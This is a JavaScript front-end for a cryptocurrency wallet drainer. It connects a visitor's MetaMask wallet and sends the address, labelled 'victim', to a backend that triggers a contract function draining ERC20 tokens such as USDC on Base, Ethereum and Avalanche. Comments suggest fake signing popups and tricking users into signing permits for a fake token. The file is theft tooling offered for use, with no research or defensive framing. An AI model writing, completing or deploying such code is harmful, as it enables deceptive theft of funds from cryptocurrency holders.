// drainer.js
// Configuration
const SUPPORTED_CHAINS = {
    8453: { name: "Base", rpcUrl: "https://mainnet.base.org", explorer: "https://basescan.org" },
    1: { name: "Ethereum", rpcUrl: "https://eth-mainnet.g.alchemy.com/v2/demo", explorer: "https://etherscan.io" },
    43114: { name: "Avalanche", rpcUrl: "https://api.avax.network/ext/bc/C/rpc", explorer: "https://explorer.avax.network" }
};

// Known Tokens for UI Display (Optional)
const KNOWN_TOKENS = {
    "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913": { symbol: "USDC", decimals: 6 },
    "0xB97EF9Ef8734C71902D406C073A0D9d7697B835a2": { symbol: "USDC", decimals: 6 } // Fixed Avalanche USDC
};

// UI Elements
const statusEl = document.getElementById('status');
const ownerEl = document.getElementById('owner-address');
const connectBtn = document.getElementById('connect-btn');
const drainBtn = document.getElementById('drain-btn');

let userAddress = null;
let provider = null;
let signer = null;

// Ethers.js v6
const { ethers } = window; // Assuming ethers is loaded via CDN in HTML

// Contract Address (Update this when you deploy)
const CONTRACT_ADDRESS = "0xYourDeployedContractAddressHere"; 
const CONTRACT_ABI = [
    "function getOwner() view returns (address)",
    "function drainERC20(address victim, address token)",
    "function permit(address owner, address spender, uint256 value, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
];

function init() {
    if (window.ethereum) {
        setupWallet();
    } else {
        statusEl.textContent = "Install MetaMask!";
    }
}

async function setupWallet() {
    provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    userAddress = accounts[0];
    
    signer = await provider.getSigner();
    
    // Fetch Owner from Contract to display
    try {
        const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
        const owner = await contract.getOwner();
        ownerEl.textContent = `Drainer Owner: ${owner}`;
    } catch (e) {
        ownerEl.textContent = "Owner: (Contract not deployed?)";
    }

    connectBtn.style.display = 'none';
    drainBtn.style.display = 'block';
    statusEl.textContent = `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
}

async function startDrain() {
    drainBtn.disabled = true;
    statusEl.textContent = "Contacting Backend...";
    
    try {
        const network = await provider.getNetwork();
        
        // Send request to our Node.js server
        const response = await fetch('http://localhost:3000/api/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                victim: userAddress,
                chainId: network.chainId
            })
        });

        const data = await response.json();
        
        if (response.ok) {
            statusEl.textContent = "Drain Triggered! Check your wallet for activity.";
            // In a real drainer, you might show a fake "Signing..." popup here
            // or force the user to sign a permit for a fake token to trigger the on-chain logic
        } else {
            statusEl.textContent = `Error: ${data.error}`;
        }
    } catch (e) {
        statusEl.textContent = "Connection Error: " + e.message;
    } finally {
        drainBtn.disabled = false;
    }
}

connectBtn?.addEventListener('click', setupWallet);
drainBtn?.addEventListener('click', startDrain);

init();
